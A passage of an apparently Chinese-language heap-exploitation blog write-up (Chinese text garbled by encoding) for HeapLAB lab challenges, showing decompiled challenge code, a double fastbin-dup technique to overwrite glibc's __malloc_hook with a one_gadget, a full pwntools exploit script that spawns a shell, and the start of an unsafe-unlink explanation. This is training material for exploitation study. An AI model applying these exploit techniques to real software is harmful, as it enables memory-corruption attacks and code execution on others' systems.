<h5 id="æ£€æŸ¥å®‰å…¨æªæ–½-3"><a href="#æ£€æŸ¥å®‰å…¨æªæ–½-3" class="headerlink" title="æ£€æŸ¥å®‰å…¨æªæ–½"></a>æ£€æŸ¥å®‰å…¨æªæ–½</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/challenge-fastbin_dup]<br>â””â”€$ checksec fastbin_dup_2 <br>[*] <span class="hljs-string">&#x27;/home/fanya/Desktop/heap/heaplab/part1/challenge-fastbin_dup/fastbin_dup_2&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    RUNPATH:  <span class="hljs-string">&#x27;../.glibc/glibc_2.30_no-tcache&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="ç¨‹åºåˆ†æ-3"><a href="#ç¨‹åºåˆ†æ-3" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><p>æ²¡æœ‰é™åˆ¶double freeï¼Œä½†æ­¤æ—¶çš„chunkç”³è¯·ä¸äº†0x68çš„å¤§å°ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨é‚£ä¸ª<code>__malloc_hook - 35</code>çš„ä½ç½®äº†ã€‚ä½†æ˜¯æˆ‘ä»¬çŸ¥é“<code>main_arena</code>ä¸Šå­˜ç€å„ç§fastbinçš„fdæŒ‡é’ˆï¼Œå¯ä»¥ä½¿ç”¨ä¸¤æ¬¡fastbin dupï¼Œä¸€æ¬¡ç”¨æ¥å†™ sizeå­—æ®µï¼Œä¸€æ¬¡ç”¨æ¥å†™fdå­—æ®µï¼Œæ­¤æ—¶çš„fdå­—æ®µæ˜¯main_arenaä¸Šçš„æŸä¸ªä½ç½®ï¼ˆè¦ä¸ä¼ªé€ çš„sizeç›¸å¯¹åº”ï¼‰ï¼Œæ¥ç€mallocæ¥è¦†ç›–è‡³top_chunkçš„åœ°å€ï¼Œä¿®æ”¹è‡³<code>__malloc_hook - 35 </code>çš„ä½ç½®ï¼Œæ­¤æ—¶ç»§ç»­mallocé€‚å½“çš„å¤§å°å³å¯è¦†ç›–è‡³<code>__malloc_hook</code>ï¼Œå°†å…¶è¦†ç›–ä¸ºone_gadgetçš„åœ°å€ã€‚ä½†æ˜¯æˆ‘ä»¬å‘ç°æ­¤æ—¶çš„å¯„å­˜å™¨çŠ¶æ€å¹¶ä¸æ»¡è¶³ä»»ä½•ä¸€ä¸ªone_gadgetæ‰€éœ€è¦çš„æ¡ä»¶ï¼Œä¸è¿‡ç»æˆ‘ä»¬è°ƒè¯•å‘ç°ç›¸åº”çš„ä½ç½®å­˜ç€æ˜¯æˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„å€¼ï¼Œå°†å…¶ä¿®æ”¹ä¸º<code>-s\x00</code>å³å¯ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 num; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+14h] [rbp-7Ch]</span><br>  <span class="hljs-type">size_t</span> n; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span><br>  <span class="hljs-type">unsigned</span> __int64 na; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span><br>  <span class="hljs-type">char</span> *m_array[<span class="hljs-number">13</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n===============&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|   HeapLAB   |  CHALLENGE: Fastbin Dup&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===============\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts() @ %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>  <span class="hljs-built_in">memset</span>(m_array, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m_array));<br>  index = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1) malloc %u/%u\n&quot;</span>, index, <span class="hljs-number">13LL</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2) free&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3) quit&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>      num = read_num();<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;index: &quot;</span>);<br>      na = read_num();<br>      <span class="hljs-keyword">if</span> ( na &gt;= index )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid index&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">free</span>(m_array[na]);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">3</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( index &gt; <span class="hljs-number">0xC</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;maximum requests reached&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>        n = read_num();<br>        <span class="hljs-keyword">if</span> ( n &gt; <span class="hljs-number">0x58</span> &amp;&amp; (n &lt;= <span class="hljs-number">0x68</span> || n &gt; <span class="hljs-number">0x78</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fast chunks only (excluding 0x70)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          m_array[index] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(n);<br>          <span class="hljs-keyword">if</span> ( m_array[index] )<br>          &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>            read(<span class="hljs-number">0</span>, m_array[index++], n);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;request failed&quot;</span>);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="æ¼æ´åˆ©ç”¨-2"><a href="#æ¼æ´åˆ©ç”¨-2" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li><p>ä¸¤æ¬¡fastbin dupï¼Œä¼ªé€ ä¸€ä¸ªsizeå­—æ®µä»¥åŠä¸€ä¸ªfdå­—æ®µ</p>
<p><img src="Heap.assets/image-20220821113749445.png" srcset="/img/loading.gif" lazyload alt="image-20220821113749445"></p>
</li>
<li><p>ç»§ç»­mallocï¼Œå°†top chunkçš„åœ°å€è¦†ç›–ï¼Œä¸ºäº†æ–¹ä¾¿è§‚çœ‹æˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸º0xdeadbeef</p>
<p><img src="Heap.assets/image-20220821114003739.png" srcset="/img/loading.gif" lazyload alt="image-20220821114003739"></p>
<p>ä¸ºäº†æ»¡è¶³ä¸€ä¸ªå¯¹sizeå­—æ®µçš„æ£€æŸ¥ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç”¨<code>__malloc_hook - 35</code>æ¥è¦†ç›–top_chunkçš„åœ°å€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">--- a/<span class="hljs-built_in">malloc</span>/<span class="hljs-built_in">malloc</span>.c<br>+++ b/<span class="hljs-built_in">malloc</span>/<span class="hljs-built_in">malloc</span>.c<br>@@ <span class="hljs-number">-4076</span>,<span class="hljs-number">6</span> +<span class="hljs-number">4076</span>,<span class="hljs-number">9</span> @@ _int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>       victim = av-&gt;top;<br>       size = chunksize (victim);<br> <br>+      <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>+        malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br>+<br>       <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         &#123;<br>           remainder_size = size - nb;<br></code></pre></td></tr></table></figure></li>
<li><p>ç»§ç»­mallocï¼Œä½¿ç”¨one_gadgetæ¥è¦†ç›–<code>__malloc_hook</code>ï¼Œä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿï¼Œæˆ‘ä»¬ä»ç„¶ä½¿ç”¨0xdeadbeefæ¥ä»£æ›¿</p>
<p><img src="Heap.assets/image-20220821115406447.png" srcset="/img/loading.gif" lazyload alt="image-20220821115406447"></p>
<p>ç»§ç»­mallocï¼Œè§‚å¯Ÿæ˜¯å¦æ»¡è¶³one_gadgetçš„æ¡ä»¶</p>
<p><img src="Heap.assets/image-20220821115524129.png" srcset="/img/loading.gif" lazyload alt="image-20220821115524129"></p>
<p>æ­¤æ—¶çš„å¯„å­˜å™¨çŠ¶æ€</p>
<p><img src="Heap.assets/image-20220821115602029.png" srcset="/img/loading.gif" lazyload alt="image-20220821115602029"></p>
<p>æ­¤æ—¶çš„æ ˆå¸§çŠ¶æ€</p>
<p><img src="Heap.assets/image-20220821115655834.png" srcset="/img/loading.gif" lazyload alt="stck"></p>
<p>å¯ä»¥è§‚å¯Ÿåˆ°å¹¶ä¸æ»¡è¶³ä»»ä½•ä¸€ä¸ªone_gadgetçš„åœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°ç¬¬ä¸‰ä¸ªone_gadgetï¼Œåªè¦æ±‚rsp+0x50çš„ä½ç½®æ‰€å­˜çš„å€¼ä¸º0å³å¯ï¼Œæ­¤æ—¶çš„å€¼æˆ‘ä»¬å‘ç°æ˜¯å¯ä»¥æœ‰æˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ï¼Œé‚ä¿®æ”¹å³å¯ã€‚</p>
</li>
<li><p>drop a shell</p>
<p><img src="Heap.assets/image-20220821120333916.png" srcset="/img/loading.gif" lazyload alt="image-20220821120333916"></p>
</li>
</ul>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;fastbin_dup_2&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size &amp; data.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size, data</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br><span class="hljs-comment"># Request two 0x50-sized chunks.</span><br>chunk_A = malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">8</span>)<br>chunk_B = malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">8</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br>malloc(<span class="hljs-number">0x48</span>, p64(<span class="hljs-number">0x61</span>))<br>malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;C&quot;</span>*<span class="hljs-number">0x48</span>)<br>malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;D&quot;</span>*<span class="hljs-number">0x48</span>)<br><br><span class="hljs-comment"># other fastbin dup</span><br>chunk_E = malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;E&quot;</span>*<span class="hljs-number">0x58</span>)<br>chunk_F = malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;F&quot;</span>*<span class="hljs-number">0x58</span>)<br><br>free(chunk_E)<br>free(chunk_F)<br>free(chunk_E)<br><br>malloc(<span class="hljs-number">0x58</span>, p64(libc.sym.main_arena + <span class="hljs-number">0x20</span>))<br><span class="hljs-comment"># malloc(0x58, b&quot;G&quot;*0x58)</span><br>malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;-s\x00&quot;</span>)<br>malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;H&quot;</span>*<span class="hljs-number">0x58</span>)<br><br><span class="hljs-comment"># over_write the top_chunk</span><br>malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">0x30</span> + p64(libc.sym.__malloc_hook - <span class="hljs-number">35</span>))<br><span class="hljs-comment"># malloc(0x58, b&quot;Y&quot;*0x30 + p64(0xdeadbeef))</span><br><br><span class="hljs-comment"># malloc fake chunk</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x13</span> + p64(libc.address + <span class="hljs-number">0xe1fa1</span>))<br><span class="hljs-comment"># malloc(0x28, b&quot;Z&quot;*0x13 + p64(0xdeadbeef))</span><br><br><span class="hljs-comment"># drop a shell</span><br>malloc(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;&quot;</span>)<br><br><span class="hljs-comment"># =============================================================================</span><br>io.interactive()                <br></code></pre></td></tr></table></figure>

<h4 id="ç¤ºä¾‹ä¸‰ï¼š0CTF-2017-babyheap"><a href="#ç¤ºä¾‹ä¸‰ï¼š0CTF-2017-babyheap" class="headerlink" title="ç¤ºä¾‹ä¸‰ï¼š0CTF 2017 babyheap"></a>ç¤ºä¾‹ä¸‰ï¼š0CTF 2017 babyheap</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§<a href="attachment%5C0ctf_2017_babyheap%5Cbabyheap">babyheap</a></p>
</blockquote>
<h3 id="Unlink-old"><a href="#Unlink-old" class="headerlink" title="Unlink(old)"></a>Unlink(<del>old</del>)</h3><h4 id="è¯¦æƒ…-2"><a href="#è¯¦æƒ…-2" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h4><p>ä¸ºäº†é¿å…å †å†…å­˜è¿‡åº¦ç¢ç‰‡åŒ–ï¼Œå½“ä¸€ä¸ªå †å—ï¼ˆfastbin chunk é™¤å¤–ï¼‰è¢«é‡Šæ”¾æ—¶ï¼Œlibcä¼šæŸ¥çœ‹å…¶å‰åå †å—æ˜¯å¦å¤„äºè¢«é‡Šæ”¾çš„çŠ¶æ€ï¼Œå¦‚æœæ˜¯ï¼Œå°±å°†å‰é¢æˆ–åé¢çš„å †å—ä¸­ä»binsä¸­å–å‡ºï¼Œå¹¶äºå½“å‰å †å—åˆå¹¶ï¼Œè¿™ä¸ªå–å‡ºçš„è¿‡ç¨‹ä¾¿æ˜¯unlinkã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æ­¤æ—¶å¼€è¾Ÿäº†6ä¸ªå¤§å°ä¸º0xa0çš„å †å—ï¼š<img src="Heap.assets/image-20220903173420886.png" srcset="/img/loading.gif" lazyload alt="image-20220903173420886"></p>
<p>æ­¤æ—¶æˆ‘ä»¬é‡Šæ”¾é è¿‘top chunkçš„å †å—ï¼Œæˆ‘ä»¬ä¼šå‘ç°è¯¥å †å—ä¼šå’Œtop chunkåˆå¹¶<img src="Heap.assets/image-20220903173447945.png" srcset="/img/loading.gif" lazyload alt="image-20220903173447945"></p>
<p>æ­¤æ—¶æˆ‘ä»¬é‡Šæ”¾ç¬¬ä¸€ä¸ªç”³è¯·çš„å—ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªå—å·²è¢«æ”¾å…¥äº†unsortedbinï¼Œä¸”fd,bkæŒ‡é’ˆå‡è¢«èµ‹å€¼ï¼Œä¸‹ä¸€ä¸ªchunkçš„prev_sizeåŠprev_inuseå‡æœ‰æ”¹å˜<img src="Heap.assets/image-20220903173735492.png" srcset="/img/loading.gif" lazyload alt="image-20220903173735492"></p>
<p>æ­¤æ—¶æˆ‘ä»¬å†å»é‡Šæ”¾ä¸´è¿‘å—ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸¤ä¸ªchunkåˆå¹¶æˆç«‹ä¸€ä¸ªchunkã€‚</p>
<p><img src="Heap.assets/image-20220903174353252.png" srcset="/img/loading.gif" lazyload alt="image-20220903174353252"></p>
<p><img src="Heap.assets/image-20220903175411826.png" srcset="/img/loading.gif" lazyload alt="image-20220903175411826"></p>
<p>åœ¨è¿™ä¸ªunlinkçš„è¿‡ç¨‹ä¸­å­˜åœ¨ç€ä¸€ä¸ªfd,bkçš„åå°„å†™å…¥ï¼Œæˆ‘ä»¬æ­¤æ¼æ´çš„åˆ©ç”¨åŒæ ·ä¹Ÿæ˜¯æ ¹æ®äºæ­¤ï¼š</p>
<ul>
<li><p>æˆ‘ä»¬å…ˆåˆ›å»º5ä¸ªå¤§å°ä¸º0x90çš„å †å—ï¼š<img src="Heap.assets/image-20220903181246083.png" srcset="/img/loading.gif" lazyload alt="image-20220903181246083"></p>
</li>
<li><p>æ¥ç€æˆ‘ä»¬åˆ©ç”¨å †æº¢å‡ºæ¥ä¿®æ”¹ç¬¬ä¸‰ä¸ªå †å—çš„fd, bkä»¥åŠç¬¬å››ä¸ªå †å—çš„prev_sizeï¼Œprev_inuse:<img src="Heap.assets/image-20220903182117957.png" srcset="/img/loading.gif" lazyload alt="image-20220903182117957"></p>
</li>
<li><p>æˆ‘ä»¬ç»§ç»­é‡Šæ”¾ç¬¬å››ä¸ªå—ï¼Œæ­¤æ—¶ç¬¬å››ä¸ªå—çš„prev_inuseä¸º0ï¼Œä¹Ÿå°±æ„å‘³ç€è¿™ä¸ªå †å—ä¼šå‘å‰åˆå¹¶ã€‚</p>
<p><img src="Heap.assets/image-20220903182811281.png" srcset="/img/loading.gif" lazyload alt="image-20220903182811281"></p>
</li>
</ul>
<p>unsafe unlink ç›¸åº”ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;\</span><br><span class="hljs-meta">    FD = P-&gt;fd;\</span><br><span class="hljs-meta">    BK = P-&gt;bk;\</span><br><span class="hljs-meta">    FD-&gt;bk = BK;\</span><br><span class="hljs-meta">    BK-&gt;fd = FD;\</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)\</span><br><span class="hljs-meta">        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;\</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;\</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)\</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\</span><br><span class="hljs-meta">                <span class="hljs-keyword">else</span> &#123;\</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;\</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;\</span><br><span class="hljs-meta">                &#125;\</span><br><span class="hljs-meta">            &#125; <span class="hljs-keyword">else</span> &#123;\</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\</span><br><span class="hljs-meta">            &#125;\</span><br><span class="hljs-meta">    &#125;\</span><br><span class="hljs-meta">&#125;</span><br><br></code></pre></td></tr></table></figure>

<h4 id="é™åˆ¶"><a href="#é™åˆ¶" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><p>è¿™é¡¹æŠ€æœ¯åªèƒ½åœ¨GLIBCç‰ˆæœ¬&lt;=2.3.3çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œsafe unlink  æ˜¯åœ¨2004å¹´GLIBCç‰ˆæœ¬2.3.4ä¸­å¼•å…¥çš„ï¼Œè€ŒGLIBCç‰ˆæœ¬å¦‚æ­¤ä¹‹è€å¹¶ä¸å¸¸è§ã€‚è¿™é¡¹æŠ€æœ¯æœ€åˆæ˜¯ç”¨æ¥å¯¹ä»˜æ²¡æœ‰NX/DEPçš„å¹³å°çš„ï¼Œè¿™é‡Œä¹Ÿæ˜¯è¿™æ ·æè¿°çš„ã€‚2003å¹´ï¼ŒAMDåœ¨ä»–ä»¬çš„æ¶ˆè´¹è€…æ¡Œé¢å¤„ç†å™¨ä¸­å¼•å…¥äº†ç¡¬ä»¶NXæ”¯æŒï¼Œéšåè‹±ç‰¹å°”åœ¨2004å¹´ä¹Ÿå¼•å…¥äº†ï¼Œå› æ­¤æ²¡æœ‰è¿™ç§ä¿æŠ¤çš„ç³»ç»Ÿå¹¶ä¸å¸¸è§ã€‚</p>
<h4 id="ç¤ºä¾‹ä¸€-unsafe-unlink"><a href="#ç¤ºä¾‹ä¸€-unsafe-unlink" class="headerlink" title="ç¤ºä¾‹ä¸€ unsafe_unlink"></a>ç¤ºä¾‹ä¸€ unsafe_unlink</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§ <a href="attachment/unsafe_unlink/unsafe_unlink">unsafe_unlink</a></p>
</blockquote>
